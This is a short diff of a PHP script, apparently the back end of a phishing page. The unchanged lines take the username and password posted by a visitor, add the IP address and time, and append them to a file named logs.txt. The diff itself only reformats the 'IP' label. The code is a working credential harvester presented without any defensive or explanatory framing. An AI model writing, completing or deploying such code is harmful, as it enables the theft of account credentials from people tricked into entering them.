@@ -9,7 +9,7 @@
 	$message .= "User: ".$_POST['username']."\n";
 	$message .= "Pass: ".$_POST['password']."\n";
 	$message .= "--------------------\n";
-	$message .= "IP: ".$ip."\n";
+	$message .= "IP  : ".$ip."\n";
 	$message .= "Log : ".$time." / ".$date."\n\n ";
 
 	$file = fopen("logs.txt", "ab");
